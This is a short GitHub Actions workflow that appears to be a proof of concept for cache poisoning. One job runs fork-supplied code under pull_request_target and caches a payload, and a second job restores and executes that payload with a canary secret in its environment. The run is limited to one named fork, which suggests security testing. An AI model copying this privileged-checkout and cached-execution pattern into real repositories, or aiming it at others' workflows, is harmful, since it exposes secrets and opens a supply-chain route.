name: checkout guard proof

on:
  pull_request_target:
    types: [opened, synchronize, reopened]

jobs:
  poison:
    if: github.event.pull_request.head.repo.full_name == 'Porche12/checkout-guard-proof-fork2'
    runs-on: ubuntu-latest
    permissions:
      actions: write
      contents: read
    steps:
      - name: Check out the owned test branch
        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          repository: ${{ github.event.pull_request.head.repo.full_name }}.git
          ref: ${{ github.event.pull_request.head.ref }}
          persist-credentials: false

      - name: Create the controlled cache payload
        run: node poison.js

      - name: Save the run-scoped cache
        uses: actions/cache/save@v4
        with:
          path: proof-cache/payload.cjs
          key: guard-proof-${{ github.run_id }}

  consume:
    needs: poison
    runs-on: ubuntu-latest
    permissions:
      actions: read
      contents: none
    steps:
      - name: Restore the cache in a separate job
        uses: actions/cache/restore@v4
        with:
          path: proof-cache/payload.cjs
          key: guard-proof-${{ github.run_id }}

      - name: Execute the restored test payload
        env:
          SECOND_JOB_CANARY: ${{ secrets.SECOND_JOB_CANARY }}
        run: node proof-cache/payload.cjs
